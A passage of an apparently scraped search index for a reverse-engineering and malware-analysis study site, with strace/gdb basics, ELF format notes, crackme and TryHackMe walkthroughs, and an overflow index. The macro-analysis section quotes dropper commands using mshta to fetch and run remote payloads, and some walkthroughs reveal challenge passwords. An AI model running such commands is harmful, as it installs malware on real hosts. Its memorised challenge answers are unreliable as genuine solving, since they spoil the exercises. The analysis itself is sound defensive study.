execve(\"./hello\", [\"./hello\"], 0x7ffd1d6a5f10 /* 65 vars */) = 0 brk(NULL) = 0x55d79226d000 mmap(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x7f714f6fb000 access(\"/etc/ld.so.preload\", R_OK) = -1 ENOENT (No such file or directory) openat(AT_FDCWD, \"/etc/ld.so.cache\", O_RDONLY|O_CLOEXEC) = 3 newfstatat(3, \"\", {st_mode=S_IFREG|0644, st_size=87170, ...}, AT_EMPTY_PATH) = 0 mmap(NULL, 87170, PROT_READ, MAP_PRIVATE, 3, 0) = 0x7f714f6e5000 close(3) = 0 openat(AT_FDCWD, \"/lib/x86_64-linux-gnu/libc.so.6\", O_RDONLY|O_CLOEXEC) = 3 read(3, \"\\177ELF\\2\\1\\1\\3\\0\\0\\0\\0\\0\\0\\0\\0\\3\\0>\\0\\1\\0\\0\\0Ps\\2\\0\\0\\0\\0\\0\"..., 832) = 832 pread64(3, \"\\6\\0\\0\\0\\4\\0\\0\\0@\\0\\0\\0\\0\\0\\0\\0@\\0\\0\\0\\0\\0\\0\\0@\\0\\0\\0\\0\\0\\0\\0\"..., 784, 64) = 784 newfstatat(3, \"\", {st_mode=S_IFREG|0755, st_size=1922136, ...}, AT_EMPTY_PATH) = 0 pread64(3, \"\\6\\0\\0\\0\\4\\0\\0\\0@\\0\\0\\0\\0\\0\\0\\0@\\0\\0\\0\\0\\0\\0\\0@\\0\\0\\0\\0\\0\\0\\0\"..., 784, 64) = 784 mmap(NULL, 1970000, PROT_READ, MAP_PRIVATE|MAP_DENYWRITE, 3, 0) = 0x7f714f504000 mmap(0x7f714f52a000, 1396736, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x26000) = 0x7f714f52a000 mmap(0x7f714f67f000, 339968, PROT_READ, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x17b000) = 0x7f714f67f000 mmap(0x7f714f6d2000, 24576, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x1ce000) = 0x7f714f6d2000 mmap(0x7f714f6d8000, 53072, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0x7f714f6d8000 close(3) = 0 mmap(NULL, 12288, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x7f714f501000 arch_prctl(ARCH_SET_FS, 0x7f714f501740) = 0 set_tid_address(0x7f714f501a10) = 164087 set_robust_list(0x7f714f501a20, 24) = 0 rseq(0x7f714f502060, 0x20, 0, 0x53053053) = 0 mprotect(0x7f714f6d2000, 16384, PROT_READ) = 0 mprotect(0x55d790bed000, 4096, PROT_READ) = 0 mprotect(0x7f714f72d000, 8192, PROT_READ) = 0 prlimit64(0, RLIMIT_STACK, NULL, {rlim_cur=8192*1024, rlim_max=RLIM64_INFINITY}) = 0 munmap(0x7f714f6e5000, 87170) = 0 newfstatat(1, \"\", {st_mode=S_IFCHR|0620, st_rdev=makedev(0x88, 0x2), ...}, AT_EMPTY_PATH) = 0 getrandom(\"\\xc7\\xf6\\xe3\\x84\\x6a\\xda\\x5c\\x57\", 8, GRND_NONBLOCK) = 8 brk(NULL) = 0x55d79226d000 brk(0x55d79228e000) = 0x55d79228e000 write(1, \"hello world!\\n\", 13hello world! ) = 13 exit_group(13) = ? +++ exited with 13 +++ Calling execve runs a program pointed to by the filename in its function argument: open and read are system calls that are used to read files. mmap , mprotect , and brk are responsible for memory activities such as allocation, permissions, and segment boundary setting. Inside the code of puts, it executes a write system call. writing data to the object it was pointed to. write ’s first parameter has a value of 1 , denoting STDOUT . The second parameter is the message. gdb  gdb can be used to show the disassembly of specified functions with the disass command (AT&T syntax): ┌──(kali㉿kali)-[~/Development/C] └─$ gdb ./hello GNU gdb (Debian 13.1-2) 13.1 [...] Reading symbols from ./hello... (No debugging symbols found in ./hello) (gdb) disass main Dump of assembler code for function main: 0x0000000000001139 <+0>: push %rbp 0x000000000000113a <+1>: mov %rsp,%rbp 0x000000000000113d <+4>: lea 0xec0(%rip),%rax # 0x2004 0x0000000000001144 <+11>: mov %rax,%rdi 0x0000000000001147 <+14>: call 0x1030 <puts@plt> 0x000000000000114c <+19>: nop 0x000000000000114d <+20>: pop %rbp 0x000000000000114e <+21>: ret End of assembler dump. (gdb) To set gdb to use Intel syntax, use: set disassembly-flavor intel To place a breakpoint at the main function: (gdb) b *main Breakpoint 1 at 0x1139 (gdb) run Starting program: /home/kali/Development/C/hello [Thread debugging using libthread_db enabled] Using host libthread_db library \"/lib/x86_64-linux-gnu/libthread_db.so.1\". Breakpoint 1, 0x0000555555555139 in main () (gdb) To get the current values of the registers: (gdb) info registers rax 0x555555555139 93824992235833 rbx 0x7fffffffdf38 140737488346936 rcx 0x555555557dd8 93824992247256 rdx 0x7fffffffdf48 140737488346952 rsi 0x7fffffffdf38 140737488346936 rdi 0x1 1 rbp 0x1 0x1 rsp 0x7fffffffde28 0x7fffffffde28 r8 0x0 0 r9 0x7ffff7fcf6a0 140737353938592 r10 0x7ffff7fcb878 140737353922680 r11 0x7ffff7fe18c0 140737354012864 r12 0x0 0 r13 0x7fffffffdf48 140737488346952 r14 0x555555557dd8 93824992247256 r15 0x7ffff7ffd020 140737354125344 rip 0x555555555139 0x555555555139 <main> eflags 0x246 [ PF ZF IF ] cs 0x33 51 ss 0x2b 43 ds 0x0 0 es 0x0 0 fs 0x0 0 gs 0x0 0 k0 0x40000000 1073741824 k1 0x1400421 20972577 k2 0x0 0 k3 0x0 0 k4 0x0 0 k5 0x0 0 k6 0x0 0 k7 0x0 0 (gdb) Now being at main, we can run each instruction with step into (the stepi ( si ) command and step over (the nexti ( ni ) command). Follow...",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "53793d62c9027f669525e10302d66d8f",
    "u": "https://reverse.tymyrddin.dev/docs/malware/signatures",
    "t": "Malware signatures ",
    "c": "Malware signatures  Depending on its variant, malware is largely obtrusive - in the sense that it leaves quite an extensive papertrail of evidence … The general process of a malware attack can be broken down into a few broad steps, which will generate data: Delivery: his could be of many methods, for example, USB (Stuxnet) or PDF attachments through “Phishing” campaigns. Execution: What does it do? If it encrypts files and leaves a ransom note, it is Ransomware. If it records keystrokes it is a Keylogger. If it collects personal preferences to display adware, it is Spyware. This stage can only be understood through analysing the sample. Maintaining persistence (not always the case!) Propagation (not always!) There are two categories of fingerprints that malware may leave behind on a Host after an attack: Host-Based Signatures are the results of execution and any persistence performed by a Malware. For example, has a file been encrypted? Has any additional software been installed? These are two of many host-based signatures that are useful to know to prevent and check against further infection. Network-Based Signatures are the observations of any networking communication taking place during delivery, execution and propagation. For example, in Ransomware, the Malware contacted which wallet for Bitcoin payments? Or for example, a large amount of “Samba” Protocol communication attempts may be an indication of WannaCry infection because of its use of “Eternalblue”.",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "66c39354cc2bb0ba8115558f2871c0e2",
    "u": "https://reverse.tymyrddin.dev/docs/thm/matter",
    "t": "THM Dunkle Materie ",
    "c": "THM Room: Dunkle Materie THM Dunkle Materie  The firewall alerted the Security Operations Center that one of the machines at the Sales department, which stores all the customers’ data, contacted the malicious domains over the network. When the Security Analysts looked closely, the data sent to the domains contained suspicious base64-encoded strings. The Analysts involved the Incident Response team in pulling the Process Monitor and network traffic data to determine if the host is infected. But once they got on the machine, they knew it was a ransomware attack by looking at the wallpaper and reading the ransomware note. Find more evidence of compromise on the host and what ransomware was involved in the attack. Load the Logfile.CSV and traffic.pcap files from the Analysis Files directory into ProcDot and click Refresh . Questions  Provide the two PIDs spawned from the malicious executable. (In the order as they appear in the analysis tool) Click on the ... Launcher button to select a process from the list. A list of processes that were active while procmon was monitoring will appear with the PIDS. Provide the full path where the ransomware initially got executed? (Include the full path in your answer) Open the \"LogFile.csv\" file in notepad and search for exploreer.exe . This ransomware transfers the information about the compromised system and the encryption results to two domains over HTTP POST . What are the two C2 domains? (no space in the answer) What are the IPs of the malicious domains? (no space in the answer) Double-click on the second instance of the malicious process ( 7128 ) and Refresh . Scroll through the captured data to find where exploreer.exe is sending and receiving a stream of TCP traffic. Provide the user-agent used to transfer the encrypted data to the C2 channel. Right-click on the mojobiden server and click Follow TCP Stream . Scroll down until you see information in red text with the User-Agent information. Provide the cloud security service that blocked the malicious domain. Right-click on the Cisco Server bubble, Follow TCP Stream . Provide the name of the bitmap that the ransomware set up as a desktop wallpaper. Search for .bmp in the file LogFile.csv using Notepad . Find the PID (Process ID) of the process which attempted to change the background wallpaper on the victim’s machine. The ransomware mounted a drive and assigned it a letter. Provide the registry key path to the mounted drive, including the drive letter. Follow thread 4892 created by 7128 to find path HKCU\\Control Panel\\Desktop\\Wallpaper and the registry path for the mounted device. Now you have collected some IOCs from this investigation. Provide the name of the ransomware used in the attack. (external research required) Look up the found C2 servers on sites like VirusTotal and AlienVault to find the name of the Ransomware. Dat’s it.",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "4365111b472c37ce44994324813bdca5",
    "u": "https://reverse.tymyrddin.dev/docs/binary/elf",
    "t": "Executable and Linkable Format (ELF) ",
    "c": "Executable and Linkable Format (ELF)  Executable and Linkable Format (ELF) is the default binary format on Linux-based systems. It is used for executable files, object files, shared libraries, and core dumps. Executable header  Every ELF file starts with an executable header, which is just a structured series of bytes telling you that it’s an ELF file, what kind of ELF file it is, and where in the file to find all the other contents. The executable header is represented in /usr/include/elf.h as a C struct called Elf64_Ehdr : #define EI_NIDENT (16) typedef struct { unsigned char e_ident[EI_NIDENT]; /* Magic number and other info */ Elf32_Half e_type; /* Object file type */ Elf32_Half e_machine; /* Architecture */ Elf32_Word e_version; /* Object file version */ Elf32_Addr e_entry; /* Entry point virtual address */ Elf32_Off e_phoff; /* Program header table file offset */ Elf32_Off e_shoff; /* Section header table file offset */ Elf32_Word e_flags; /* Processor-specific flags */ Elf32_Half e_ehsize; /* ELF header size in bytes */ Elf32_Half e_phentsize; /* Program header table entry size */ Elf32_Half e_phnum; /* Program header table entry count */ Elf32_Half e_shentsize; /* Section header table entry size */ Elf32_Half e_shnum; /* Section header table entry count */ Elf32_Half e_shstrndx; /* Section header string table index */ } Elf32_Ehdr; e_ident  The executable header (and the ELF file) starts with a 16-byte array called e_ident . The e_ident array always starts with a 4-byte “magic value” identifying the file as an ELF binary. The magic value consists of the hexadecimal number 0x7f , followed by the ASCII character codes for the letters E, L, and F. Having these bytes right at the start is convenient because it allows tools such as file, as well as specialized tools such as the binary loader, to quickly discover that they’re dealing with an ELF file. /* Fields in the e_ident array. The EI_* macros are indices into the array. The macros under each EI_* macro are the values the byte may have. */ #define EI_MAG0 0 /* File identification byte 0 index */ #define ELFMAG0 0x7f /* Magic number byte 0 */ #define EI_MAG1 1 /* File identification byte 1 index */ #define ELFMAG1 'E' /* Magic number byte 1 */ #define EI_MAG2 2 /* File identification byte 2 index */ #define ELFMAG2 'L' /* Magic number byte 2 */ #define EI_MAG3 3 /* File identification byte 3 index */ #define ELFMAG3 'F' /* Magic number byte 3 */ /* Conglomeration of the identification bytes, for easy testing as a word. */ #define ELFMAG \"\\177ELF\" #define SELFMAG 4 Following the magic value, there are a number of bytes that give more detailed information about the specifics of the type of ELF file. In elf.h , the indexes for these bytes (indexes 4 through 15 in the e_ident array) are symbolically referred to as EI_CLASS , EI_DATA , EI_VERSION , EI_OSABI , EI_ABIVERSION , and EI_PAD , respectively. #define EI_CLASS 4 /* File class byte index */ #define ELFCLASSNONE 0 /* Invalid class */ #define ELFCLASS32 1 /* 32-bit objects */ #define ELFCLASS64 2 /* 64-bit objects */ #define ELFCLASSNUM 3 The EI_CLASS byte denotes whether the binary is for a 32-bit or 64-bit architecture. In the former case, the EI_CLASS byte is set to the constant ELFCLASS32 (which is equal to 1), while in the latter case, it’s set to ELFCLASS64 (equal to 2). #define EI_DATA 5 /* Data encoding byte index */ #define ELFDATANONE 0 /* Invalid data encoding */ #define ELFDATA2LSB 1 /* 2's complement, little endian */ #define ELFDATA2MSB 2 /* 2's complement, big endian */ #define ELFDATANUM 3 The EI_DATA byte indicates the endianness of the binary. A value of ELFDATA2LSB (equal to 1) indicates little-endian, while ELFDATA2MSB (equal to 2) means big-endian. #define EI_VERSION 6 /* File version byte index */ /* Value must be EV_CURRENT */ The next byte, called EI_VERSION , indicates the version of the ELF specification used when creating the binary. Currently, the only valid value is EV_CURRENT , which is defined to be equal to 1. #define EI_OSABI 7 /* OS ABI identification */ #define ELFOSABI_NONE 0 /* UNIX System V ABI */ #define ELFOSABI_SYSV 0 /* Alias. */ #define ELFOSABI_HPUX 1 /* HP-UX */ #define ELFOSABI_NETBSD 2 /* NetBSD. */ #define ELFOSABI_GNU 3 /* Object uses GNU ELF extensions. */ #define ELFOSABI_LINUX ELFOSABI_GNU /* Compatibility alias. */ #define ELFOSABI_SOLARIS 6 /* Sun Solaris. */ #define ELFOSABI_AIX 7 /* IBM AIX. */ #define ELFOSABI_IRIX 8 /* SGI Irix. */ #define ELFOSABI_FREEBSD 9 /* FreeBSD. */ #define ELFOSABI_TRU64 10 /* Compaq TRU64 UNIX. */ #define ELFOSABI_MODESTO 11 /* Novell Modesto. */ #define ELFOSABI_OPENBSD 12 /* OpenBSD. */ #define ELFOSABI_ARM_AEABI 64 /* ARM EABI */ #define ELFOSABI_ARM 97 /* ARM */ #define ELFOSABI_STANDALONE 255 /* Standalone (embedded) application */ If the EI_OSABI byte is set to nonzero, it means that some ABI- or OS-specific extensions are used in the ELF file; this can change the meaning of some other fields in the binary or can signal the presence of nonstandard sections. The default value of zero indicates that the binary targets the UNIX System V ABI. #define EI_ABIVERSION 8 /* ABI version */ The EI_ABIVERSION byte denotes the specific version of the ABI indicated in the EI_OSABI byte that the binary targets. You’ll usually see this set to zero because it’s not necessary to specify any version information when the default EI_OSABI is used. #define EI_PAD 9 /* Byte index of padding bytes */ The EI_PAD field actually contains multiple bytes, namely, indexes 9 through 15 in e_ident . All of these bytes are currently designated as padding; they are reserved for possible future use but currently set to zero. To inspect the e_ident array of an ELF binary (in this case the a.out from hello.c ): nina@tardis:~/Development/elf$ readelf -h a.out ELF Header: Magic: 7f 45 4c 46 02 01 01 00 00 00 00 00 00 00 00 00 Class: ELF64 Data: 2's complement, little endian Version: 1 (current) OS/ABI: UNIX - System V ABI Version: 0 Type: DYN (Position-Independent Executable file) Machine: Advanced Micro Devices X86-64 Version: 0x1 Entry point address: 0x1060 Start of program headers: 64 (bytes into file) Start of section headers: 13976 (bytes into file) Flags: 0x0 Size of this header: 64 (bytes) Size of program headers: 56 (bytes) Number of program headers: 13 Size of section headers: 64 (bytes) Number of section headers: 31 Section header string table index: 30 e_type, e_machine, and e_version  After the e_ident array comes a series of multibyte integer fields. e_type specifies the type of the binary, with values ET_REL (relocatable object file), ET_EXEC (executable binary), and ET_DYN (a dynamic library). /* Legal values for e_type (object file type). */ #define ET_NONE 0 /* No file type */ #define ET_REL 1 /* Relocatable file */ #define ET_EXEC 2 /* Executable file */ #define ET_DYN 3 /* Shared object file */ #define ET_CORE 4 /* Core file */ #define ET_NUM 5 /* Number of defined types */ #define ET_LOOS 0xfe00 /* OS-specific range start */ #define ET_HIOS 0xfeff /* OS-specific range end */ #define ET_LOPROC 0xff00 /* Processor-specific range start */ #define ET_HIPROC 0xffff /* Processor-specific range end */ e_machine denotes the architecture that the binary is intended to run on: /* Legal values for e_machine (architecture). */ #define EM_NONE 0 /* No machine */ #define EM_M32 1 /* AT&T WE 32100 */ #define EM_SPARC 2 /* SUN SPARC */ #define EM_386 3 /* Intel 80386 */ #define EM_68K 4 /* Motorola m68k family */ #define EM_88K 5 /* Motorola m88k family */ #define EM_IAMCU 6 /* Intel MCU */ #define EM_860 7 /* Intel 80860 */ #define EM_MIPS 8 /* MIPS R3000 big-endian */ #define EM_S370 9 /* IBM System/370 */ #define EM_MIPS_RS3_LE 10 /* MIPS R3000 little-endian */ /* reserved 11-14 */ #define EM_PARISC 15 /* HPPA */ /* reserved 16 */ #define EM_VPP500 17 /* Fujitsu VPP500 */ #define EM_SPARC32PLUS 18 /* Sun's \"v8plus\" */ #define EM_960 19 /* Intel 80960 */ #define EM_PPC 20 /*...",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "dc4140bda2dce64fefc7c3692e6a92ce",
    "u": "https://reverse.tymyrddin.dev/docs/root-me/elf-cpp-0",
    "t": "ELF C++ 0 protection ",
    "c": "ELF C++ 0 protection  RootMe challenge: ELF C++ - 0 protection : std::string Find the validation password. Make the file executable: ┌──(kali㉿kali)-[~/Downloads/cracking/ch25] └─$ chmod +x ch25.bin Check it runs in gdb: ┌──(kali㉿kali)-[~/Downloads/cracking/ch25] └─$ gdb ./ch25.bin GNU gdb (Debian 13.1-2) 13.1 Copyright (C) 2023 Free Software Foundation, Inc. License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html> This is free software: you are free to change and redistribute it. There is NO WARRANTY, to the extent permitted by law. Type \"show copying\" and \"show warranty\" for details. This GDB was configured as \"x86_64-linux-gnu\". Type \"show configuration\" for configuration details. For bug reporting instructions, please see: <https://www.gnu.org/software/gdb/bugs/>. Find the GDB manual and other documentation resources online at: <http://www.gnu.org/software/gdb/documentation/>. For help, type \"help\". Type \"apropos word\" to search for commands related to \"word\"... Reading symbols from ./ch25.bin... (No debugging symbols found in ./ch25.bin) (gdb) run 123 Starting program: /home/kali/Downloads/cracking/ch25/ch25.bin 123 [Thread debugging using libthread_db enabled] Using host libthread_db library \"/lib/x86_64-linux-gnu/libthread_db.so.1\". Password incorrect. [Inferior 1 (process 31179) exited normally] Start up Ghidra and find the phrase “Password incorrect.”: Brings this function: Which uses this function comparing two passed parameters, an input string, and a string of the program. We just need to find out what string is passed to this function to solve this problem. The address from where the function is called ( 0x08048B92 ): In gdb, set a breakpoint at the address where the function is called ( 0x08048B92 ) and look at the registers. The password will be pointed to by ESP -> EAX -> MEM . Resources  Reversing C++ - Blackhat - Yason Sabanal - paper Reversing C++ - Blackhat - Yason Sabanal - slides",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "a38ee1ec4a13fbb9090a3dadbfe25de7",
    "u": "https://reverse.tymyrddin.dev/docs/thm/macros",
    "t": "Analysing malicious Microsoft Office macros ",
    "c": "THM Room: REMnux Analysing malicious Microsoft Office macros  Malware infection via malicious macros (or scripts within Microsoft Office products such as Word and Excel) are some of the most successful attacks to date. For example, current APT campaigns such as Emotet, QuickBot infect users by sending seemingly legitimate documents attached to emails i.e. an invoice for business. However, once opened, execute malicious code without the user knowing. This malicious code is often used in what’s known as a “dropper attack”, where additional malicious programs are downloaded onto the host. To analyze macros we can use ViperMonkey , a parser engine that is capable of analysing visual basic macros without executing. Questions  What is the name of the Macro for DefinitelyALegitInvoice.doc Recorded Actions: +----------------------+---------------------------+----------------+ | Action | Parameters | Description | +----------------------+---------------------------+----------------+ | Found Heuristic | DefoLegit | | | Entry Point | | | | Execute Command | cmd /c mshta http://10.0. | Shell function | | | 0.10:4444/MyDropper.exe | | | Found Heuristic | DefoLegit | | | Entry Point | | | | Execute Command | cmd /c mshta http://10.0. | Shell function | | | 0.10:4444/MyDropper.exe | | +----------------------+---------------------------+----------------+INFO Found 7 possible IOCs. Stripping duplicates... VBA Builtins Called: ['Shell']Finished analyzing DefinitelyALegitInvoice.doc . What is the URL the Macro in Taxes2020.doc would try to launch? Recorded Actions: +----------------------+---------------------------+----------------+ | Action | Parameters | Description | +----------------------+---------------------------+----------------+ | Found Heuristic | X544FE | | | Entry Point | | | | Execute Command | cmd /c mshta http://tryha | Shell function | | | ckme.com/notac2cserver.sh | | | Found Heuristic | X544FE | | | Entry Point | | | | Execute Command | cmd /c mshta http://tryha | Shell function | | | ckme.com/notac2cserver.sh | | +----------------------+---------------------------+----------------+",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "543466dfe21037e6fdab694e16247581",
    "u": "https://reverse.tymyrddin.dev/docs/root-me/elf-x86-basic",
    "t": "ELF x86 basic ",
    "c": "ELF x86 basic  RootMe challenge: ELF x86 - Basic Find the validation password. ┌──(kali㉿kali)-[~/Downloads/cracking/ch2] └─$ ./ch2.bin ############################################################ ## Bienvennue dans ce challenge de cracking ## ############################################################ username: Bad username ┌──(kali㉿kali)-[~/Downloads/cracking/ch2] └─$ strings ch2.bin | grep ^username -B 5 -A 2 john the ripper ############################################################ ## Bienvennue dans ce challenge de cracking ## ############################################################ username: password: 987654321 Resources  The GNU binary utils Reverse Engineering pour Débutants - Dennis Yurichev Executable and Linkable Format ELF Reverse Engineering for Beginners - Dennis Yurichev",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "54d3e5ee05e10b169f3e6fd20e4f80c2",
    "u": "https://reverse.tymyrddin.dev/docs/root-me/elf-x86-random",
    "t": "ELF x86 random crackme ",
    "c": "ELF x86 random crackme  Root-me challenge : This crackme can be solved in many different ways. We’ll let you find them. Note that you might get errors when executing the application. This is expected :) Compiler : GCC 4.3; Architecture: intel (x86) 32Bits Use, for example r2 Go to main() . Visual Mode In function 0x8048da3 find address to look at.",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "0d063b6b53da6c17a865e5820ac485fe",
    "u": "https://reverse.tymyrddin.dev/docs/malware/history",
    "t": "History of malware ",
    "c": "History of malware  Some small stories on how malicious software (malware) has evolved into the complicated viruses we may be exposed to today. Interview with Ray Tomlinson on Creeper/Reaper Malware spotlight: Wabbit The Animal Episode Elk-Cloner: The 30-year-old prank that became the first computer virus With Microscope and Tweezers: An Analysis of the Internet Virus of November 1988 YouTube: Virus.DOS.Cascade onx/CASCADE",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "795c2580b7e4da69f94b0216acac33ee",
    "u": "https://reverse.tymyrddin.dev/docs/root-me/readme",
    "t": "Introduction ",
    "c": "Introduction  What?  Executable file format root-me challenges. Why?  Dive into real binary formats. How?  ELF x86 0 protection ELF x86 basic PE x86 0 protection ELF C++ 0 protection Godot 0 protection PE DotNet 0 protection ELF MIPS basic crackme ELF x64 golang basic ELF x86 fake instructions ELF x86 ptrace Godot bytecode WASM introduction ELF ARM basic crackme Godot mono PYC bytecode ELF x86 no software breakpoints ELF ARM crackme 1337 ELF x86 crackpass ELF x86 exploitme ELF x86 random crackme GB basic Game Boy crackme APK anti-debug",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "50920f8b34aeed0dcae262910fab5b2d",
    "u": "https://reverse.tymyrddin.dev/docs/root-me/elf-x64-go-basic",
    "t": "ELF x64 golang basic ",
    "c": "ELF x64 golang basic  Root-me challenge : Find the validation password. ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, Go BuildID=2cf6d44559551c6185a598406fb67318d5b2396e , with debug_info , not stripped Analysis Golang calling convention uses the stack for parameters and return values. There is a bytes.Compare call between the xored flag and the key Dump the xored flag rexor it with the key Resources  Reversing Golang Binaries Like a Pro - RedNaga Golang Reverse - Zaytsev",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "de4e57982b40332cfba66ccb69ae9b3e",
    "u": "https://reverse.tymyrddin.dev/docs/root-me/pyc-bytecode",
    "t": "PYC bytecode ",
    "c": "PYC bytecode  Root-me challenge : A compiled crackme. Retrieve the password to validate this challenge. Open in hex editor and use first 4 bits to identify the Python version. Use decompyle6 to decompile. Python code with: K = KEY = 'I know, you love decrypting Byte Code !' S = SOLUCE = [57, 73, 79, 16, 18, 26, 74, 50, 13, 38, 13, 79, 86, 86, 87] I = (I + N) % len(KEY) X = FLAG = ? Resources  Beyond python bytecode",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "99e58e305808e29783edd43e664facd5",
    "u": "https://reverse.tymyrddin.dev/docs/thm/pdfs",
    "t": "Analysing malicious pdfs ",
    "c": "THM Room: REMnux Analysing malicious pdfs  PDFs can contain code that can be executed without the user’s knowledge: Javascript Python Executables Powershell Shellcode Questions  How many types of categories of Suspicious elements are there in notsuspicious.pdf remnux@thm-remnux:~/Tasks/3$ peepdf notsuspicious.pdf Warning: PyV8 is not installed!!File: notsuspicious.pdf MD5: 2992490eb3c13d8006e8e17315a9190e SHA1: 75884015d6d984a4fcde046159f4c8f9857500ee SHA256: 83fefd2512591b8d06cda47d56650f9cbb75f2e8dbe0ab4186bf4c0483ef468a Size: 28891 bytes Version: 1.7 Binary: True Linearized: False Encrypted: False Updates: 0 Objects: 18 Streams: 3 URIs: 0 Comments: 0 Errors: 0Version 0: Catalog: 1 Info: 7 Objects (18): [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18] Streams (3): [4, 15, 18] Encoded (2): [15, 18] Objects with JS code (1): [6] Suspicious elements: /OpenAction (1): [1] /JS (1): [6] /JavaScript (1): [6] Use peepdf to extract the javascript from notsuspicious.pdf . What is the flag? remnux@thm-remnux:~/Tasks/3$ echo ‘extract js > javascript-from-demo_notsuspicious.pdf’ > extracted_javascript.txt remnux@thm-remnux:~/Tasks/3$ peepdf -s extracted_javascript.txt demo_notsuspicious.pdf remnux@thm-remnux:~/Tasks/3$ cat javascript-from-demo_notsuspicious.pdf // peepdf comment: Javascript code located in object 6 (version 0)app.alert(\"THM{Luckily_This_Isn't_Harmful}\"); How many types of categories of Suspicious elements are there in advert.pdf remnux@thm-remnux:~/Tasks/3$ peepdf advert.pdf Warning: PyV8 is not installed!!File: advert.pdf MD5: 1b79db939b1a77a2f14030f9fd165645 SHA1: e760b618943fe8399ac1af032621b6e7b327a772 SHA256: 09bb03e57d14961e522446e1e81184ca0b4e4278f080979d80ef20dacbbe50b7 Size: 74870 bytes Version: 1.7 Binary: True Linearized: False Encrypted: False Updates: 2 Objects: 29 Streams: 6 URIs: 0 Comments: 0 Errors: 1Version 0: Catalog: 1 Info: 9 Objects (22): [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22] Compressed objects (7): [10, 11, 12, 13, 14, 15, 16] Streams (5): [4, 17, 19, 20, 22] Xref streams (1): [22] Object streams (1): [17] Encoded (4): [4, 17, 19, 22] Suspicious elements: /Names (1): [13]Version 1: Catalog: 1 Info: 9 Objects (0): [] Streams (0): []Version 2: Catalog: 1 Info: 9 Objects (7): [1, 3, 24, 25, 26, 27, 28] Streams (1): [26] Encoded (1): [26] Objects with JS code (1): [27] Suspicious elements: /OpenAction (1): [1] /Names (2): [24, 1] /AA (1): [3] /JS (1): [27] /Launch (1): [28] /JavaScript (1): [27] Now use peepdf to extract the javascript from advert.pdf . What is the value of cName ? remnux@thm-remnux:~/Tasks/3$ echo ‘extract js > javascript-from-advert.pdf’ > extracted_javascript.txt remnux@thm-remnux:~/Tasks/3$ peepdf -s extracted_javascript.txt advert.pdf remnux@thm-remnux:~/Tasks/3$ cat javascript-from-advert.pdf // peepdf comment: Javascript code located in object 27 (version 2)this.exportDataObject({ cName: \"notsuspicious\", nLaunch: 0``` Still, the advert.pdf actually does have an embedded executable. View the extracted Javascript. When the PDF is opened, the user will be asked to save an attachment.",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "ecdb01f515e52d81767a9d0bd133da57",
    "u": "https://reverse.tymyrddin.dev/docs/root-me/pe-x86-0",
    "t": "PE x86 0 protection ",
    "c": "PE x86 0 protection  RootMe challenge: PE x86 - 0 protection : This challenge comes from greHack CTF 2012. Retrieve the password to validate this challenge. Resources  Microsoft Portable Executable and Common Object File Format Specification Reverse Engineering pour Débutants - Dennis Yurichev Introduction au format Portable Executable PE Reverse Engineering for Beginners - Dennis Yurichev",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "d7317f9513059658157ac2af045effa9",
    "u": "https://reverse.tymyrddin.dev/docs/binary/readme",
    "t": "Introduction ",
    "c": "Introduction  What?  The anatomy of binary formats and the binary life cycle. Why?  Machine code is fed to a computer’s processor in the form of binary files. These machine code files must target a specific computer platform, the combination of operating system and hardware architecture. How?  Anatomy of binaries Executable and Linkable Format (ELF) Portable Executable (PE) format",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "1bfecd79deed70cb2d4218ce27bbae44",
    "u": "https://bof.tymyrddin.dev/",
    "t": "Waterfalls ",
    "c": "Waterfalls  Nearly all applications, web servers, and web application environments are vulnerable to buffer overflows. Environments that are written in interpreted languages, such as Java and Python, are immune to the attacks, with the exception of overflows in their interpreter. These issues are particularly problematic in the programming language C/C++ as it does not have buffer overflow protection built in. Buffer overflows are used in many of the exploits against vulnerable services. Most of these are pre-compiled by exploit developers. To be able to generate payloads locally, set up a Kali VM with the necessary tools, and a Windows VM with Immunity Debugger (on the same network). Testlab Virtual machines Assemblers Compilers Disassemblers Debuggers Decompilers Exploit development Exploitation tools Notes on techniques Introduction Stack operations and function-calling Linux x86 exploits Coding Windows Linux TryHackMe Introduction Using Immunity Debugger Example payload scripts Brainstorm Gatekeeper Root-me Introduction ELF x86: Stack buffer overflow basic 1 ELF x64: Basic heap overflow ELF x86: Stack buffer overflow basic 2 ELF x86: Format string bug basic 1 ELF x64: Stack buffer overflow basic ELF x86: Format string bug basic 2 ELF x86: Race condition ELF ARM: Stack buffer overflow basic ELF x86: Stack buffer overflow basic 3 ELF x86: Use after free basic ELF x86: BSS buffer overflow ELF x86: Stack buffer overflow basic 4 ELF x86: Stack buffer overflow basic 6 ELF x86: Format string bug basic 3 ELF ARM: Basic ROP ELF x86: Stack buffer overflow C++ vtables ELF x86: Stack buffer overflow basic 5 ELF x86: Remote format string bug",
    "cat": "red_through",
    "type": "html"
  },
  {
